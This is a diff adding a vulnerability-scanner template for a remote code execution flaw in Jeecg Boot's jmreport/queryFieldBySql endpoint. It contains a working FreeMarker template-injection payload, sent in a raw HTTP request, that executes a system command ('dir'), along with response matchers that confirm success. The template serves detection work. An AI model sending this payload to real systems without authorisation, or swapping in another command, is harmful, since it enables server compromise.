@@ -1,0 +1,35 @@
+id: jeecg-jmreport-queryfieldbysql-rce
+info:
+  name: Jeecg Boot jmreport/queryFieldBySql Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Jeecg Boot is an open-source enterprise-level rapid development platform. This template detects code execution vulnerabilities in the jmreport/queryFieldBySql interface.
+  reference:
+    - https://my.oschina.net/jeecg/blog/10096283
+  classification:
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"dir\")}'"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "fieldName"
+          - "\"code\":200"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "freemarker.template.utility.execute"
